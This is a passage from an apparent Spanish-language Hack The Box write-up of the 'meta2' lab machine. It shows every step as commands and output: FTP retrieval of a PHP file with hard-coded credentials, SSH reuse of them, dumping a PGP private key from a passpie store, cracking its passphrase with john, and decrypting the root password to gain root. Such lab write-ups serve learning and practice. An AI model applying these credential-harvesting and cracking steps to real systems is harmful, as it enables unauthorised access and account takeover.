+</span><span class="kd">ftp></span>
+</code></pre></div></div>
+
+<div><p>Podemos ver un php, asi que lo descargamos, parece que contiene credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">ftp></span><span class="p"> cd mailer
+</span><span class="kd">ftp></span><span class="p"> dir
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
+-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22 18:32 send_email.php
+226 Transfer complete
+</span><span class="kd">ftp></span><span class="p"> get send_email.php
+local: send_email.php remote: send_email.php
+150 Opening BINARY mode data connection for send_email.php (1126 bytes)
+226 Transfer complete
+1126 bytes received in 0.00 secs (8.3243 MB/s)
+</span><span class="kd">ftp></span><span class="p"> exit
+221 Goodbye.
+
+</span><span class="s2">❯ cat</span><span class="p"> send_email.php
+<?php
+</span><span class="c1">/*
+ * This script will be used to send an email to all our users when ready for launch
+*/
+
+</span><span class="kd">use</span><span class="p"> PHPMailer\PHPMailer\PHPMailer;
+</span><span class="kd">use</span><span class="p"> PHPMailer\PHPMailer\SMTP;
+</span><span class="kd">use</span><span class="p"> PHPMailer\PHPMailer\Exception;
+
+</span><span class="k">require </span><span class="s2">'PHPMailer/src/Exception.php'</span><span class="p">;
+</span><span class="k">require </span><span class="s2">'PHPMailer/src/PHPMailer.php'</span><span class="p">;
+</span><span class="k">require </span><span class="s2">'PHPMailer/src/SMTP.php'</span><span class="p">;
+
+$mail </span><span class="kd">=</span><span class="k"> new</span><span class="p"> PHPMailer(</span><span class="na">true</span><span class="p">);
+
+$mail->SMTPDebug </span><span class="kd">=</span><span class="na"> 3</span><span class="p">;
+$mail->isSMTP();
+
+$mail->Host </span><span class="kd">=</span><span class="s2"> "mail.metapress.htb"</span><span class="p">;
+$mail->SMTPAuth </span><span class="kd">=</span><span class="na"> true</span><span class="p">;
+$mail->Username </span><span class="kd">=</span><span class="s2"> "jnelson@metapress.htb"</span><span class="p">;
+$mail->Password </span><span class="kd">=</span><span class="s2"> "Cb4_JmWM8zUZWMu@Ys"</span><span class="p">;
+$mail->SMTPSecure </span><span class="kd">=</span><span class="s2"> "tls"</span><span class="p">;
+$mail->Port </span><span class="kd">=</span><span class="na"> 587</span><span class="p">;
+
+$mail->From </span><span class="kd">=</span><span class="s2"> "jnelson@metapress.htb"</span><span class="p">;
+$mail->FromName </span><span class="kd">= </span><span class="s2">"James Nelson"</span><span class="p">;
+
+$mail->addAddress(</span><span class="s2">"info@metapress.htb"</span><span class="p">);
+
+$mail->isHTML(</span><span class="na">true</span><span class="p">);
+
+$mail->Subject </span><span class="kd">=</span><span class="s2"> "Startup"</span><span class="p">;
+$mail->Body </span><span class="kd">=</span><span class="s2"> "&lti>We just started our new blog metapress.htb!&lt/i>"</span><span class="p">;
+
+</span><span class="kd">try</span><span class="p"> {
+    $mail->send();
+</span><span class="kd">    echo </span><span class="s2">"Message has been sent successfully"</span><span class="p">;
+} </span><span class="kd">catch</span><span class="p"> (</span><span class="k">Exception</span><span class="p"> $e) {
+</span><span class="kd">    echo </span><span class="s2">"Mailer Error: "</span><span class="kd"> .</span><span class="p"> $mail->ErrorInfo;
+}</span>
+</code></pre></div></div>
+
+<div><p>Con las credenciales nos conectamos a ssh y podemos ver la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">jnelson@10.10.11.186
+jnelson@10.10.11.186's password: </span><span class="kd">Cb4_JmWM8zUZWMu@Ys</span><span class="p">
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(jnelson) gid=1000(jnelson) groups=1000(jnelson)
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.186 
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+6d0**************************87d
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando archivos ocultos podemos ver .passpie y dentro un archivo .keys</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -a
+</span><span class="na">.  ..</span><span class="p">  .bash_logout  .bashrc  .local  </span><span class="na">.passpie  .profile</span><span class="p">  user.txt
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -a .passpie
+</span><span class="na">.  .. </span><span class="s2"> .config  .keys  </span><span class="na">ssh
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En las ultimas lineas podemos ver una key privada, la pasamos a nuestro equipo como key</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat .passpie/.keys | tail -n45
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+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
+=7Uo6
+-----END PGP PRIVATE KEY BLOCK-----
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+
+<div><p>Ahora le hacemos un gpg2john al archivo, deciframos su hash y vemos la contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gpg2john </span><span class="p">key > hash
+File key
+
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+</span><span class="kd">blink182         </span><span class="p">(</span><span class="na">Passpie</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+
+<div><p>Hay un archivo root.pass desordenado, le damos forma y lo metemos en /dev/shm como new.pass</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~/.passpie/ssh</span><span class="p">$ cat root.pass 
+comment: ''
+fullname: root@ssh
+login: root
+modified: 2022-06-26 08:58:15.621572
+name: ssh
+password: '-----BEGIN PGP MESSAGE-----
+
+
+  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+
+  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+
+  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+
+  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+
+  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+
+  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+
+  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+
+  lpF0RatbxQGWBks5F3o=
+
+  =uh1B
+
+  -----END PGP MESSAGE-----
+
+  '
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~/.passpie/ssh</span><span class="p">$</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+
+<code><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ cat new.pass 
+-----BEGIN PGP MESSAGE-----
+hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+/2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+lpF0RatbxQGWBks5F3o=
+=uh1B
+-----END PGP MESSAGE-----
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p"></span>
+</code></pre></div></div>
+
+<div><p>Desencriptamos el mensaje con passpie y al leer de nuevo el archivo podemos ver una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ passpie export new.pass
+Passphrase: </span><span class="kd">blink182</span><span class="p">
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ cat new.pass 
+credentials:
+- comment: ''
+  fullname: root@ssh
+  login: root
+  modified: 2022-06-26 08:58:15.621572
+  name: ssh
+  password: !!python/unicode '</span><span class="kd">p7qfAZt4_A1xo_0x</span><span class="p">'
+- comment: ''
+  fullname: jnelson@ssh
+  login: jnelson
+  modified: 2022-06-26 08:58:15.514422
+  name: ssh
+  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
+handler: passpie
+version: 1.0
+</span><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos hacer su root usando esa contraseña y completamos la maquina</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jnelson@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">$ su root
+Password: </span><span class="kd">p7qfAZt4_A1xo_0x</span><span class="p">
+</span><span class="s2">root@meta2</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@meta2</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.10.11.186
+</span><span class="s2">root@meta2</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt 
+15b**************************4fd
+</span><span class="s2">root@meta2</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>      
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
